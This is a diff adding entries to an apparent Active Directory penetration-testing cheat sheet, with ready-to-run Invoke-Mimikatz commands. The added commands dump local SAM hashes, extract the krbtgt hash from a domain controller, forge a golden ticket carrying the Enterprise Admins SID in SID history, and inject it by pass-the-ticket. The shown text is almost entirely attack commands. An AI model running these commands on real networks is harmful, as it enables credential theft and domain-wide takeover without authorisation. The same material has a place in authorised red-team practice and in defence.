@@ -195,7 +195,19 @@ I would recommend becoming familiar with different tooling that can be used to d
 "privilege::debug" grants account SeDebugPrivilege
 ```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
-
+```
+Get krbtgt hash on a DC
+```powershell
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
+```
+Get/Set SID history for enterprise admin group
+```powershell 
+Get-NetGroup -Domain <domain> -GroupName "Enterprise Admins" -FullData | select samaccountname, objectsid
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /sids:<sids> /krbtgt:<hash> /ticket:<path to save ticket>"'
+```
+Inject Ticket
+```powershell
+Invoke-Mimikatz -Command '"kerberos::ptt <path to ticket>"'
 ```
 ## Lateral Movement
 All the PS remoting 
